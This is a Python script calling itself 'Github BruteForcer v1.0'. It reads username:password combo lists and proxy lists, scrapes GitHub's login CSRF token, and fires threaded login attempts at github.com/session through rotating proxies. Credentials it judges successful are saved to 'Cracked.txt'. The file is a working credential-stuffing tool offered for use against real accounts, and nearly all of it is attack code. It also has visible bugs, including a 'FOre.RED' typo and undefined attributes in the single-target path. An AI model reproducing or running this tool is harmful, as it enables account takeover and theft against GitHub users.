from requests import session
from bs4 import BeautifulSoup as bs
from threading import Thread
from sys import argv, exit
from os import system, name
from colorama import Fore, Style
from threading import Thread
from random import choice
from time import sleep
import sys
import random


class BruteForce(object):
    def __init__(self):
        self.cls()
        self.logo()
        self.combo = input("""
        {}Combo List FileName {}-> {}{}""".format(
            Fore.GREEN, Fore.BLUE, Fore.YELLOW, Style.RESET_ALL
        ))
        self.proxies = input("""
        {}Proxy List FileName {}-> {}{}""".format(
            Fore.GREEN, Fore.BLUE, Fore.YELLOW, Style.RESET_ALL
        ))
        self.make_mass_request()

    def logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = r"""
                            $$\
                            \__|
                            $$\  $$$$$$$\  $$$$$$\
                            $$ |$$  _____|$$  __$$\
                            $$ |$$ /      $$ /  $$ |
                            $$ |$$ |      $$ |  $$ |
                            $$ |\$$$$$$$\ \$$$$$$$ |
                            \__| \_______| \____$$ |
                                          $$\   $$ |
                                          \$$$$$$  |
                                           \______/
                    Github BruteForcer v1.0, Wrote by iwhh with <3 For U
                                    iran-cyber.net
                                    github.com/iwhh
                                    t.me/W91745
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            sleep(0.05)

    def mass_send_request(self, username, password, proxies):
        prx = {"http": proxies}
        URL = 'https://github.com/session'
        try:
            with session() as sess:
                req = sess.get(URL).text
                html = bs(req, "html.parser")
                token = html.find("input", {"name": "authenticity_token"}).attrs['value']
                commit = html.find("input", {"name": "commit"}).attrs['value']
                login_data = {'login': username,
                              'password': password,
                              'commit': commit,
                              "authenticity_token": token}
                send_post = sess.post(URL, data=login_data, proxies=prx)
            if "We just sent your authentication code via email to" in send_post.text:
                print("{}-------------------\n{}[{}!{}] {}Success!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))
                with open("Cracked.txt", mode="a") as _:
                    _.write("{}:{}\n".format(username, password))
                    _.close()

            elif "Start a project" in send_post.text:
                print("{}-------------------\n{}[{}!{}] {}Success!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))
                with open("Cracked.txt", mode="a") as _:
                    _.write("{}:{}\n".format(username, password))
                    _.close()
            elif "<p>There have been several failed attempts to sign in from this account or IP address. Please wait a while and try again later.</p>" in send_post.text:
                print("{}-------------------\n{}[{}!{}] {}Success!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))
                with open("Cracked.txt", mode="a") as _:
                    _.write("{}:{}\n".format(username, password))
                    _.close()
            else:
                print("{}-------------------\n{}[{}!{}] {}Failed!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.RED, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))
                with open("x.htm", mode="w") as x:
                    x.write(send_post.text)
                    x.close()
        except AttributeError:
            print()

    def make_mass_request(self):
        with open(self.proxies, mode="r") as _:
            proxy_list = _.read().splitlines()
            _.close()

        with open(self.combo, mode="r") as _:
            combo_list = _.read().splitlines()
            _.close()

        for combo in combo_list:
            random_proxy = choice(proxy_list)
            if combo != "":
                username = combo.split(":")[0]
                password = combo.split(":")[1]
                Thread(target=self.mass_send_request, args=(
                    username, password, random_proxy
                )).start()
            else:
                print()

    def single_send_request(self, username, password, proxies):
        prx = {"http": proxies}
        URL = 'https://github.com/session'

        with session() as sess:
            req = sess.get(URL).text
            html = bs(req, "html.parser")
            token = html.find("input", {"name": "authenticity_token"}).attrs['value']
            commit = html.find("input", {"name": "commit"}).attrs['value']
            login_data = {'login': username,
                          'password': password,
                          'commit': commit,
                          "authenticity_token": token}
            send_post = sess.post(URL, data=login_data, proxies=prx)
            if "We just sent your authentication code via email to" in send_post.text:
                print("{}-------------------\n{}[{}!{}] {}Success!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))
                with open("Cracked.txt", mode="a") as _:
                    _.write("{}:{}\n".format(username, password))
                    _.close()
            elif "Start a project" in send_post.text:
                print("{}-------------------\n{}[{}!{}] {}Success!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))
                with open("Cracked.txt", mode="a") as _:
                    _.write("{}:{}\n".format(username, password))
                    _.close()

            else:
                print("{}-------------------\n{}[{}{}!{}] {}Failed!\n{}{}{}:{}{}{}".format(
                    Fore.MAGENTA, Fore.YELLOW, FOre.RED, Fore.YELLOW, Fore.RED, Fore.YELLOW, username, Fore.BLUE,
                    Fore.YELLOW,
                    password, Style.RESET_ALL
                ))

    def make_single_request(self):
        with open(self.proxies, mode="r") as _:
            proxy_list = _.read().splitlines()
            _.close()

        with open(self.password_list, mode="r") as _:
            password_list = _.read().splitlines()
            _.close()

        for password in password_list:
            random_proxy = choice(proxy_list)
            if password != "":
                username = self.username
                Thread(target=self.mass_send_request, args=(
                    username, password, random_proxy
                )).start()
            else:
                print()

    def cls(self):
        if name == "nt":
            system("cls")
        else:
            system("clear")


if __name__ == "__main__":
    try:
        run = BruteForce()
    except KeyboardInterrupt:
        print("\nGood Bye !")
